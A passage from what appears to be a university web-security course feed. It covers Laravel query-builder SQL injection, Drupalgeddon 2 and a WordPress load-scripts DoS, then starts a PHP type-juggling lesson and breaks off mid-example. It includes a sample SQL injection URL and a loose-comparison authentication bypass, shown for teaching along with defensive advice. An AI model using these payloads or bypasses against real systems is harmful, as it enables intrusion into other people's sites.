The company had to make a public announcement asking users to reset their passwords, and report the incident to their regulatory authorities.&lt;/p>
&lt;h1 id="framework-vulnerabilities">Framework Vulnerabilities&lt;/h1>
&lt;p>Web application framework is a collection of pieces of software designed to ease the development of web applications.
Web application frameworks provide common solutions for a wide variety of tasks such as database access, input filtering for security purposes, authentication, session handling and templates for website development.&lt;/p>
&lt;p>There are several different types of web application frameworks:&lt;/p>
&lt;ul>
&lt;li>General purpose website frameworks (Ruby On Rails, ExpressJS, Django, Flask)&lt;/li>
&lt;li>Discussion forums, wikis and weblogs (WikiBase/WikiWikiWeb)&lt;/li>
&lt;li>Organizational portals (JBoss Portal)&lt;/li>
&lt;li>Content Management Systems (CMS) (Joomla, Drupal, Wordpress)&lt;/li>
&lt;/ul>
&lt;p>When performing a security audition (or hacking) of a website it is necessary to identify the implementation technologies of the target.
This identification can be done manually or more commonly using automated tools, such as &lt;a href="https://builtwith.com/">BuiltWith&lt;/a> and &lt;a href="https://www.wappalyzer.com/">Wappalyzer&lt;/a>.
Once the web application framework is detected further penetration steps depend on the framework.
Quite a few websites are done with CMSs and contain no application-specific custom code.
For these applications, identifying the CMSs modules used and their version is necessary.
This information can be used further to search for vulnerabilities or perform a manual code inspection of the modules used.
Finding a security flaw usually means that the website has not been properly updated.
If a manual inspection of CMS modules reveals vulnerabilities, it is very likely that these modules are used in other websites, which makes them vulnerable as well.&lt;/p>
&lt;p>The most widely used web Frameworks provide lots of security mechanisms by default - for example, Django provides protection for SQL injection, XSS injection, clickjacking and many more.
However, from time to time vulnerabilities are found and attackers have numerous possible targets, since some of these frameworks are extremely popular.&lt;/p>
&lt;p>The rest of the section contains examples of vulnerabilities found in various framework versions.&lt;/p>
&lt;h2 id="laravel">Laravel&lt;/h2>
&lt;p>Laravel is one of the &lt;a href="https://customerthink.com/what-makes-laravel-the-most-preferred-php-framework-for-web-development/">most preferred&lt;/a> PHP Frameworks for Web Development.&lt;/p>
&lt;p>In 2019 a vulnerability was found for the popular Laravel-query-builder package.
Due to the way Laravel builder parses the string to query, the hacker can leverage this to attack the application with an SQL Injection attack.&lt;/p>
&lt;p>The package is parsing the URLs to add some filters to the queries.&lt;/p>
&lt;p>For example, if you want to sort the articles by title:&lt;/p>
&lt;p>&lt;code>https://example.com/articles?sort=title&lt;/code>&lt;/p>
&lt;p>You may use the following code to automatically sort by the package:&lt;/p>
&lt;pre tabindex="0">&lt;code>use Spatie\QueryBuilder\QueryBuilder;
$articles = QueryBuilder::for(Article::class)-&amp;gt;get();
&lt;/code>&lt;/pre>&lt;p>This will be translated into:&lt;/p>
&lt;p>&lt;code>Article::orderBy('title')-&amp;gt;get();&lt;/code>&lt;/p>
&lt;p>And the underlined SQL query will be:&lt;/p>
&lt;p>&lt;code>SELECT * FROM 'articles' ORDER BY 'title' ASC&lt;/code>&lt;/p>
&lt;p>The attacker can take advantage of this transformation to perform an SQL Injection attack, by changing the URL to:&lt;/p>
&lt;p>&lt;code>https://example.com/articles?sort=title-&amp;gt;&amp;quot;%27))injectedSQL&lt;/code>&lt;/p>
&lt;p>Since Laravel supports queries in JSON fields, it will guess that you want to query json &lt;code>title-&amp;gt;&lt;/code> so it replaces &lt;code>-&amp;gt;&lt;/code> with JSON MySQL functions.
The attacker closes the function brackets &lt;code>))&lt;/code> and adds his injected SQL.&lt;/p>
&lt;p>The final command:&lt;/p>
&lt;p>&lt;code>SELECT * FROM articles ORDER BY json_unquote(json_extract(title, '$.&amp;quot;&amp;quot;'))&lt;/code>&lt;strong>&lt;code>injectedSQL&lt;/code>&lt;/strong>&lt;code>&amp;quot;')) ASC&lt;/code>&lt;/p>
&lt;p>&lt;strong>Vulnerable versions:&lt;/strong>&lt;/p>
&lt;p>Laravel 5.6/5.7/5.8 with Laravel-query-builder &amp;lt; v1.17.1
Laravel 5.5 with Laravel-query-builder &amp;lt; v1.16.1&lt;/p>
&lt;h2 id="drupal">Drupal&lt;/h2>
&lt;p>Drupal is a free and open-source web content management framework written in PHP.
Drupal provides a back-end framework for at least 2.3% of all websites worldwide – ranging from personal blogs to corporate, political, and government sites.
According to builtwith.com, 473 of the Quantcast top 10,000 websites use Drupal, and that number jumps up to 4,341 when you look at the top 100,000.&lt;/p>
&lt;p>Drupal introduced a Form API in Drupal 6 which allowed alteration of the form data during the form rendering process.
In 2018, Drupal released a patch adding just a single class, &lt;em>RequestSanitizer&lt;/em>, with a &lt;em>stripDangerousValues&lt;/em> method that resets all the items in an input array for keys that start with a hash sign.
This method sanitizes input data in &lt;code>$_GET&lt;/code>, &lt;code>$_POST&lt;/code> and &lt;code>$_COOKIES&lt;/code> during the very early stages of Drupal’s bootstrap (immediately after loading the site configurations).
It can be assumed that the reason why the patch was released is to make an existing vulnerability harder to find.&lt;/p>
&lt;p>The vulnerability was found in the forms.
The user registration form which requires no authentication and can be accessed anonymously contains multiple input fields and can be exploited.&lt;/p>
&lt;p>&lt;img src="./assets/drupal1.png" alt="Form Fields">&lt;/p>
&lt;p>It was highly probable that injecting a renderable array would exploit the vulnerability, the question was where?&lt;/p>
&lt;p>As it turns out, the “Email Address” field doesn’t sanitize the type of input it receives which allows hackers to inject the renderable array to the form array structure.
Renderable arrays contain metadata that is used in the rendering process.&lt;/p>
&lt;p>&lt;img src="./assets/drupal2.png" alt="Injected Array">&lt;/p>
&lt;p>Since Drupal treats the injected array as a value and not as an element, attackers need to trick Drupal into rendering it.
Drupal renders an array on page load events or via Drupal AJAX API.&lt;/p>
&lt;p>The &amp;ldquo;Picture&amp;rdquo; field of the user registration form uses Drupal’s AJAX API to upload a picture and replace it with a thumbnail of the uploaded image.&lt;/p>
&lt;p>What&amp;rsquo;s more important about this attack is that a Russian Security Researcher posted a &lt;a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py">POC&lt;/a> on Github and soon after numerous people started using it to install cryptocurrency miners and malware backdoors.&lt;/p>
&lt;p>&lt;strong>Vulnerable versions:&lt;/strong>&lt;/p>
&lt;p>Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 ~ user/register URL, attacking account/mail &amp;amp; #post_render parameter, using PHP&amp;rsquo;s passthru function
Drupal &amp;lt; 7.58 ~ user/password URL, attacking triggering_element_name form &amp;amp; #post_render parameter, using PHP&amp;rsquo;s passthru function&lt;/p>
&lt;h2 id="wordpress">WordPress&lt;/h2>
&lt;p>Details of a serious Denial of Service (DoS) vulnerability in WordPress have been published by an Israeli security researcher named Barak Tawily.
This vulnerability can be used to take down a website in a matter of minutes.&lt;/p>
&lt;p>The vulnerability is listed on the CVE (Common Vulnerabilities and Exposures) website as CVE-2018-6389 and on Exploit DB as exploit number 43968.
Barak Tawily first wrote about it on February 5, 2018 on his blog.&lt;/p>
&lt;p>This issue is related to a file called load-scripts.php, which is a part of the WordPress core.
This file is used to improve the performance by loading multiple external JavaScript (JS) files in a single request.&lt;/p>
&lt;p>Barak first noticed the problem when he saw an unusual URL that was loading when he visited certain WordPress pages.
That URL was:&lt;/p>
&lt;p>&lt;code>https://DOMAINNAME/wp-admin/load-scripts.php?c=1&amp;amp;load%5B%5D=jquery-ui-core&amp;amp;ver=4.9.1&lt;/code>&lt;/p>
&lt;p>He noticed that the load-scripts.php file was receiving a parameter called load[].
This parameter is an array that was receiving the names of the JS files that needed to be loaded.
In this case, it was receiving jQuery UI Core, which is the name of one of the Javascript files used by the WordPress login page.&lt;/p>
&lt;p>Because WordPress is an open source platform, it was simple for Barak to review the application’s code and determine precisely how WordPress loaded these files.
He discovered that load-scripts.php file was designed to economize the loading of external JS files.
Another file, called load-styles.php, was doing the same thing for Cascading Style Sheet (CSS) files.&lt;/p>
&lt;p>This feature allowed the browser to receive multiple files with a single request, dramatically improving the load time of each admin page.
Although it was only designed for use on admin pages, it was also being used on the login page — before the user had been authenticated.
This oversight is responsible for the vulnerability.&lt;/p>
&lt;p>He continued to explore the source code of WordPress and discovered that there is a variable that contains a defined list of scripts that can be loaded.
If one of the names in the load[] array matches one of these script names, the server will perform an I/O read action to load it.
The list of scripts that are available is defined in a file called script-loader.php.
It includes 181 different scripts.
The server took ~2.2 seconds to gather the files, merge them into one file, and send them to the browser.
After performing 500 requests, the server was overloaded and became unable to respond to subsequent requests.
He posted a &lt;a href="https://www.youtube.com/watch?v=nNDsGTalXS0&amp;amp;feature=youtu.be">video&lt;/a> showing how quickly it could be used to take down a WordPress website.&lt;/p>
&lt;h3 id="wpscan">WPScan&lt;/h3>
&lt;p>The &lt;a href="https://wpscan.com/wordpress-security-scanner">WPScan&lt;/a> CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites.
The WPScan CLI tool uses a database of WordPress vulnerabilities - from WordPress versions, plugins, themes etc.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;ul>
&lt;li>Metropolia University of Applied Sciences&lt;/li>
&lt;li>&lt;a href="https://blog.papertrailapp.com/common-api-vulnerabilities-and-how-to-secure-them/">https://blog.papertrailapp.com/common-api-vulnerabilities-and-how-to-secure-them/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://techterms.com/definition/framework">https://techterms.com/definition/framework&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://owasp.org/www-project-api-security/">https://owasp.org/www-project-api-security/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.checkmarx.com/blog/breaking-down-owasp-api-security-top10-part1">https://www.checkmarx.com/blog/breaking-down-owasp-api-security-top10-part1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://securityboulevard.com/2020/01/breaking-down-the-owasp-api-security-top-10-part-2/">https://securityboulevard.com/2020/01/breaking-down-the-owasp-api-security-top-10-part-2/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://shieldfy.io/blog/serious-sql-injection-vulnerability-in-laravel-query-builder/">https://shieldfy.io/blog/serious-sql-injection-vulnerability-in-laravel-query-builder/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.secpod.com/blog/drupalgeddon-2/">https://www.secpod.com/blog/drupalgeddon-2/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.threatpress.com/wordpress-vulnerability-dos/">https://blog.threatpress.com/wordpress-vulnerability-dos/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://freek.dev/1317-an-important-security-release-for-laravel-query-builder">https://freek.dev/1317-an-important-security-release-for-laravel-query-builder&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/ca1512a0-0616-11ed-be56-0fec9572decd">Clean up&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/f2efab30-0616-11ed-bb34-19a4ff512c6d">High Score&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/0cb44c00-0617-11ed-80ab-4758bca0c77e">Snoop Doggy Dogg&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/2026cea0-0617-11ed-8d3f-19288a331f73">The Accountant&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/vavkamil/dvwp">Damn Vulnerable WordPress&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Essentials:</title><link>/essentials/application-lifetime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/application-lifetime/</guid><description>
&lt;h1 id="application-lifetime">Application Lifetime&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;p>Use &lt;a href="https://github.com/ekalinin/github-markdown-toc">gh-md-toc&lt;/a>.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Objectives and rationale for the current session.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;ul>
&lt;li>Information required for this section&lt;/li>
&lt;li>Commands / snippets that should be known, useful to copy-paste throughout the practical session&lt;/li>
&lt;/ul>
&lt;h2 id="content-sections">Content Sections:&lt;/h2>
&lt;ul>
&lt;li>Content split in sections, according to session specifics&lt;/li>
&lt;li>Demos will be part of the session presentation and will be referenced (snippets, images, links) in the content&lt;/li>
&lt;/ul>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;ul>
&lt;li>Sumamrizing session concepts&lt;/li>
&lt;li>Summarizing commands / snippets that are useful for tutorials, challenges (easy reference, copy-paste)&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;p>Tasks for the students to solve. They may be of two types:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Tutorials&lt;/strong> - simpler tasks accompanied by more detailed, walkthrough-like explanations&lt;/li>
&lt;li>&lt;strong>Challenges&lt;/strong> - the good stuff&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;p>Any links or references to extra information.&lt;/p></description></item><item><title>Web:</title><link>/web/exotic-attacks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/exotic-attacks/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>As a web developer, you need to pay attention to the quirks of your chosen programming language.
There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.&lt;/p>
&lt;p>The most common server-side language on the web today is still &lt;strong>PHP&lt;/strong>.
There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it.
Today, even if there are better options for the server-side choice, PHP is still pretty popular.&lt;/p>
&lt;p>&lt;img src="./assets/language-stats.png" alt="Server Side Languages Popularity">&lt;/p>
&lt;p>Source &lt;a href="https://w3techs.com/technologies/overview/programming_language">here&lt;/a>.&lt;/p>
&lt;p>There are also lots of different PHP versions, each with its own vulnerabilities.
A small insight into the distribution of versions across the web is:&lt;/p>
&lt;p>&lt;img src="./assets/version-stats.png" alt="PHP Versions Popularity">&lt;/p>
&lt;p>Source &lt;a href="https://w3techs.com/technologies/details/pl-php">here&lt;/a>.&lt;/p>
&lt;p>In this session we will focus on some exotic attacks against specific PHP functions and functionalities, as well as a quick overview of other interesting quirks.&lt;/p>
&lt;h1 id="php-type-juggling">PHP Type Juggling&lt;/h1>
&lt;p>Much like Python and Javascript, PHP is a dynamically typed language.
This means that variable types are checked while the program is executing.
For example, let’s take a variable called &lt;code>$var&lt;/code>.
If we assign a string value to it, it becomes a string.
If an integer value is then assigned to &lt;code>$var&lt;/code>, it becomes an integer.&lt;/p>
&lt;p>Dynamic typing allows developers to be more flexible when using PHP.
But this kind of flexibility sometimes causes unexpected errors in the program flow and can even introduce critical vulnerabilities into the application.&lt;/p>
&lt;p>In this section we will discuss &lt;strong>PHP type juggling&lt;/strong> and how this can lead to authentication bypass vulnerabilities.&lt;/p>
&lt;p>&lt;img src="./assets/type-juggling.png" alt="Type Juggling examples">&lt;/p>
&lt;h2 id="how-php-compares-values">How PHP compares values&lt;/h2>
&lt;p>PHP has a feature called &amp;ldquo;type juggling&amp;rdquo; or &amp;ldquo;type coercion&amp;rdquo;.
This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type.&lt;/p>
&lt;p>For example, when the program is comparing the string &lt;code>&amp;quot;7&amp;quot;&lt;/code> and the integer &lt;code>7&lt;/code> in the scenario below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_str&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;7&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#000">$example_str&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;PHP can compare ints and strings.&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The code will run without errors and output &lt;code>PHP can compare ints and strings.&lt;/code>.
This behavior is very helpful when you want your program to be flexible in dealing with different types of user input.&lt;/p>
&lt;p>However, it is also important to note that this behavior is also a major source of bugs and security vulnerabilities.&lt;/p>
&lt;p>For example, when PHP needs to compare the string &lt;code>&amp;quot;7 puppies&amp;quot;&lt;/code> to the integer &lt;code>7&lt;/code>, PHP will attempt to extract the integer from the string.
So this comparison will evaluate to &lt;strong>True&lt;/strong>.&lt;/p>
&lt;p>&lt;code>(&amp;quot;7 puppies&amp;quot; == 7) -&amp;gt; True&lt;/code>&lt;/p>
&lt;p>But what if the string that is being compared does not contain an integer? The string will then be converted to a &lt;code>&amp;quot;0&amp;quot;&lt;/code>.
So the following comparison will also evaluate to &lt;strong>True&lt;/strong>:&lt;/p>
&lt;p>&lt;code>(&amp;quot;Puppies&amp;quot; == 0) -&amp;gt; True&lt;/code>&lt;/p>
&lt;p>You can try this yourself using an online PHP sandbox, such as &lt;a href="http://www.writephponline.com/">this one&lt;/a>.&lt;/p>
&lt;h2 id="loose-comparison-vs-strict-comparison--vs-">Loose Comparison vs. Strict Comparison (&lt;code>==&lt;/code> vs &lt;code>===&lt;/code>)&lt;/h2>
&lt;p>The &lt;code>==&lt;/code> and &lt;code>!=&lt;/code> are the default comparison operators in other languages.
But PHP has two main comparison modes, let’s call them &lt;strong>loose&lt;/strong> (&lt;code>==&lt;/code> and &lt;code>!=&lt;/code>) and &lt;strong>strict&lt;/strong> (&lt;code>===&lt;/code> and &lt;code>!==&lt;/code>).&lt;/p>
&lt;p>The strict mode works by also comparing the type of the variable as well as the value.
So, for example, if we compare the number &lt;code>7&lt;/code> and the string &lt;code>&amp;quot;7&amp;quot;&lt;/code>, the result will be false because of the different types.
This time, PHP won’t use type juggling before comparing the values.&lt;/p>
&lt;p>The following tables showcase the difference between the two comparison modes:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Loose comparison&lt;/th>
&lt;th>Strict comparison&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;img src="./assets/loose-comparison.png" alt="Loose comparison">&lt;/td>
&lt;td>&lt;img src="./assets/strict-comparison.png" alt="Strict comparison">&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>However, loose type comparison behavior like the one presented above is pretty common in PHP and many built-in functions work in the same way.
You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?&lt;/p>
&lt;h2 id="how-vulnerability-arises">How vulnerability arises&lt;/h2>
&lt;p>The most common way that this particularity in PHP is exploited is by using it to bypass authentication.
Let’s say the PHP code that handles authentication looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$_POST&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Admin_Password&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">login_as_admin&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then, simply submitting an integer input of &lt;code>0&lt;/code> would successfully log you in as admin, since this will evaluate to &lt;strong>True&lt;/strong>:&lt;/p>
&lt;p>&lt;code>(0 == &amp;quot;Admin_Password&amp;quot;) -&amp;gt; True&lt;/code>&lt;/p>
&lt;h3 id="conditions-of-exploitation">Conditions of exploitation&lt;/h3>
&lt;p>However, this vulnerability is not always exploitable and often needs to be combined with a deserialization flaw.
The reason for this is that &lt;strong>POST&lt;/strong>, &lt;strong>GET&lt;/strong> parameters and &lt;strong>cookie&lt;/strong> values are, for the most part, passed as strings or arrays into the program.&lt;/p>
&lt;p>If the &lt;strong>POST&lt;/strong> parameter from the example above was passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed.
And &lt;code>&amp;quot;0&amp;quot;&lt;/code> and &lt;code>&amp;quot;Admin_Password&amp;quot;&lt;/code> are, obviously, different strings.&lt;/p>
&lt;p>&lt;code>(&amp;quot;0&amp;quot; == &amp;quot;Admin_Password&amp;quot;) -&amp;gt; False&lt;/code>&lt;/p>
&lt;p>However, type juggling issues can be exploited if the application accepts the input via functions like &lt;code>json_decode()&lt;/code> or &lt;code>unserialize()&lt;/code>.
This way, it would be possible for the end-user to specify the type of input passed in.&lt;/p>
&lt;p>&lt;code>{&amp;quot;password&amp;quot;: &amp;quot;0&amp;quot;}&lt;/code>
&lt;code>{&amp;quot;password&amp;quot;: 0}&lt;/code>&lt;/p>
&lt;p>Consider the above JSON blobs.
The first one would cause the password parameter to be treated as a string whereas the second one would cause the input to be interpreted as an integer by PHP.
This gives an attacker fine-grained control of the input data type and therefore the ability to exploit type juggling issues.&lt;/p>
&lt;h2 id="avoiding-type-juggling-issues-in-php-code">Avoiding type juggling issues in PHP code&lt;/h2>
&lt;p>As a developer, there are several steps that you can take to prevent these vulnerabilities from happening.&lt;/p>
&lt;h3 id="use-strict-comparison-operators">Use strict comparison operators&lt;/h3>
&lt;p>When comparing values, always try to use the type-safe comparison operator &lt;code>===&lt;/code> instead of the loose comparison operator &lt;code>==&lt;/code>.
This will ensure that PHP does not type juggle and the operation will only return &lt;strong>True&lt;/strong> if the types of the two variables also match.
This means that &lt;code>(7 === &amp;quot;7&amp;quot;)&lt;/code> will return &lt;strong>False&lt;/strong>.&lt;/p>
&lt;h3 id="specify-the-strict-option-for-functions-that-compare">Specify the &amp;ldquo;strict&amp;rdquo; option for functions that compare&lt;/h3>
&lt;p>Always consult the PHP manual on individual functions to check if they use loose comparison or type-safe comparison.
See if there is an option to use strict comparison and specify that option in your code.&lt;/p>
&lt;p>For example, PHP’s &lt;code>in_array()&lt;/code> uses loose comparison by default.
But you can make it switch to type-safe comparison by specifying the &lt;code>strict&lt;/code> option.
If the function only provides loose comparison, avoid using that function and search for alternatives instead.&lt;/p>
&lt;h3 id="avoid-typecasting-before-comparison">Avoid typecasting before comparison&lt;/h3>
&lt;p>Avoid typecasting right before comparing values, as this will essentially deliver the same results as type juggling.
For example, before typecasting, the following three variables are all seen as distinct by the type-safe operator.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_str&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;7_string&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_str_2&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;7&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">===&lt;/span> &lt;span style="color:#000">$example_str&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// This condition statement will return False
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;This will not print.&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">===&lt;/span> &lt;span style="color:#000">$example_str_2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// This condition statement will return False
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;This will not print.&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Whereas after typecasting, PHP will only preserve the number extracted from a string, and &lt;code>&amp;quot;7_string&amp;quot;&lt;/code> will become the integer &lt;code>7&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$example_str&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;7_string&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
